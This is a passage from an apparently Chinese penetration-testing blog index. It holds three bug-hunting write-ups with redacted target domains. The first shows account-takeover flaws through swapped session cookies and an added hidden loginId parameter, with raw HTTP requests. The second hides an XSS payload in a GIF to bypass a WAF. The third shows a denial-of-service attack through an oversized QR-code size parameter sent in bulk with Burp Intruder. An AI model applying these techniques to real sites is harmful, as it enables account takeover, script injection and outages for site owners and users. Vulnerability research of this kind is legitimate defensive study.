Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://www.xxx.com/ppc/valid/showResetPassword.do</span><br><span class="line">Content-Length: 37</span><br><span class="line">Cookie: JSESSIONID=E1AC27A7302C03C9432DE2254B99311A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">password=qwer1111&amp;rePassword=qwer1111</span><br></pre></td></tr></table></figure><p>这里的数据包中并没有出现用用户的参数信息，所以这里面的话，可以判断这里应该是用<code>cookie</code>作为身份的判断的。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/51.png" alt="图片"></p><p>到第一步去获取验证码的时候，点击下一页，可以获取到该用户<code>wangshuai</code>对应的内容</p><p><code>Cookie: JSESSIONID=E1AC27A7302C03C9432DE2254B99311A</code></p><p>拿到这个<code>cookie</code>就意味着可以利用这个身份判断标识去重置这个用户的密码了。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/52.png" alt="图片"></p><p>替换得到的cookie值，即把cookie对应的用户wangshuai的密码修改为qwer1234</p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>关键点:<code>cookie</code>可指定用户获取,尝试用他人账号来找回密码的时候，抓取数据包，可以从中提取出<code>cookie</code>值，然后就可以利用这个<code>cookie</code>值，就可以重置指定用户的密码了。</p><h2 id="修改信息时替换字段值"><a href="#修改信息时替换字段值" class="headerlink" title="修改信息时替换字段值"></a>修改信息时替换字段值</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/53.png" alt="图片"></p><h2 id="造成原因-8"><a href="#造成原因-8" class="headerlink" title="造成原因"></a>造成原因</h2><p>在执行修改信息的<code>sql</code>语句的时候，用户的密码也当作字段执行了，而且是根据<code>隐藏</code>参数<code>loginid</code>来执行的，这样就导致<code>修改隐藏</code>参数<code>loginid</code>的值，就可以修改他人的用户密码。</p><h2 id="测试方法-8"><a href="#测试方法-8" class="headerlink" title="测试方法"></a>测试方法</h2><p>修改个人资料的时候，抓取数据包，然后来修改数据包的参数和对应的值，参数名一般可以在<code>其他地方</code>找到，<code>替换</code>隐藏<code>参数</code>即可修改他人的密码等信息。</p><h2 id="案例-8"><a href="#案例-8" class="headerlink" title="案例"></a>案例</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/54.png" alt="图片"></p><p>点击<code>保存信息</code>抓取数据包</p><p>数据包:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /xxxxx/employee_updateEmployeeInf.action HTTP/1.1</span><br><span class="line">Host: www.xxxxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: https://www.xxxxx.com/xxxxx/employee_forUpdate.action</span><br><span class="line">Cookie: JSESSIONID=A115648DB5F49215078E583ABB6A665A; FLGSID=FLGSRV1; loginUrl=&quot;&quot;Connection: close</span><br><span class="line">Content-Type: multipart/form-data;boundary=---------------------------222991508618208</span><br><span class="line">Content-Length: 709</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;mobileNo&quot;</span><br><span class="line">177XXXXXXXX</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;departId&quot;</span><br><span class="line">49</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;minority&quot;</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;sex&quot;</span><br><span class="line">1</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;birthday&quot;</span><br><span class="line">19920829</span><br><span class="line">-----------------------------222991508618208</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">-----------------------------222991508618208--</span><br></pre></td></tr></table></figure><p>可以看到数据包里只有这几个参数<code>mobileNo、departId、minority、sex、birthdaymobileNo</code>是用户对应的手机号我们尝试修改<code>mobileNo</code>的值，所获得的效果就是我们的手机号修改了，而这个手机号本身就是可以修改的。这个数据包中并没有找到我们标识用户身份的参数信息，唯一可以修改的手机号也只是表单中直接修改可以改变的。接下来我们去找一下隐藏参数。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:https://www.xxx.com/ua/employee/forUpdate.do</span><br></pre></td></tr></table></figure><p>查看下这个页面的源代码，找到了一个参数<code>loginId</code>，这个参数是对应用户身份的而我们发现 上面的数据包里没有这个参数，那么我们是否可以自己添加上去呢？</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/55.png" alt="图片"></p><p>这里修改数据包，添加字段<code>loginId</code>，并且把值修改为他人的用户，发包返回修改成功，这样就成功的把用户<code>871xxxx</code>的密码改为跟我们密码相同的值。</p><h2 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h2><p>最后一种要稍微复杂一点，得去找到隐藏参数:<code>loginId</code>然后再修改数据包，以后挖洞的时候，多留意这些。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过图片触发XssPayload从而绕过WAF</title>
      <link href="/2019/05/27/xss-2/"/>
      <url>/2019/05/27/xss-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>假设如果XSS的PayLoad被拦截，那么把XSS的PayLoad放到载体里面，这样会不会Bypass呢？</p></blockquote><p>一个正常的<code>gif</code>图片加上一个XSS的PayLoad，然后通过脚本将<code>XssPayload</code>注入到图片里面：</p><h3 id="利用Python脚本将PayLoad注入到图片里面"><a href="#利用Python脚本将PayLoad注入到图片里面" class="headerlink" title="利用Python脚本将PayLoad注入到图片里面"></a>利用Python脚本将PayLoad注入到图片里面</h3><p><code>python jsingif.py -i hack.gif &quot;javascript:alert(&#39;Power_Liu&#39;)&quot;</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/18.jpg" alt="图片"><br>然后用记事本打开图片看看：<br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/19.jpg" alt="图片"><br>可以看出：图片末尾有这样一串代码:<code>*/=1;javascript:alert(&#39;Power_Liu&#39;);</code><br>为了验证这个<code>XSS</code>是否生效，这里用到<code>Html</code>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Power_Liu—Test-XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;hack.gif&quot;\&gt;</span><br><span class="line">    &lt;script src= &quot;hack.gif&quot;&gt; &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;　</span><br><span class="line">&lt;/html&gt;　</span><br></pre></td></tr></table></figure><p>打开后的testxss.html：<br><img src="img/20.jpg" alt="图片"></p><blockquote><p>script标签把图片当成JavaScript代码执行了，因为我们把乱码的数据通过多行注释/**/给注释掉了，所以JavaScript会执行我们的PayLoad，这样可以绕过WAF</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>验证码大小可控可导致CUP爆满造成网站瘫痪</title>
      <link href="/2019/03/18/dos-1/"/>
      <url>/2019/03/18/dos-1/</url>
      
        <content type="html"><![CDATA[<h2 id="验证码大小可控可导致CUP爆满造成网站瘫痪"><a href="#验证码大小可控可导致CUP爆满造成网站瘫痪" class="headerlink" title="验证码大小可控可导致CUP爆满造成网站瘫痪"></a>验证码大小可控可导致CUP爆满造成网站瘫痪</h2><p>来看这个URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/normal/download/qrcode?size=200&amp;convert=https://www.xxx.com/download.html?app=gzim&amp;from=singlemessage&amp;isappinstalled=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/11.jpg" alt="图片"></p><p>注意这个参数：<code>size=200</code>，可以看到下面服务器访问速度是<code>76ms</code>，图片是<code>948B</code>说明很快，那么我们把<code>200</code>改成<code>10000</code></p><p>构造URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/normal/download/qrcode?size=10000&amp;convert=https://wx.xxx.com/download.html?app=gzim&amp;from=singlemessage&amp;isappinstalled=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/12.jpg" alt="图片"><br>改成<code>10000</code>的时候服务器响应速度是<code>1.55s</code>，图片字节是<code>161KB</code>了，那么我们继续改，改成<code>38000</code></p><p>构造URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/normal/download/qrcode?size=38000&amp;convert=https://wx.xxx.com/download.html?app=gzim&amp;from=singlemessage&amp;isappinstalled=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/13.jpg" alt="图片"></p><p>这时候响应速度是<code>15.90s</code>，图片字节变成了<code>1.6MB</code>!说明验证码大小可控！</p><p>接着打开<code>BurpSuite</code>抓包：访问<code>40000</code></p><p>构造URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/normal/download/qrcode?size=40000&amp;convert=https://wx.xxx.com/download.html?app=gzim&amp;from=singlemessage&amp;isappinstalled=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/14.jpg" alt="图片"></p><p>接着吧数据包发送到<code>Intruder</code>：（爆破40000后四位的参数，让BurpSuite访问）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/15.jpg" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/16.jpg" alt="图片"></p><p>最后访问它的域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/17.jpg" alt="图片"></p><p>我这边网站一直在加载中！打不开！具体我没敢吧参数调大，怕吧网站整蹦了影响他们的业务….</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
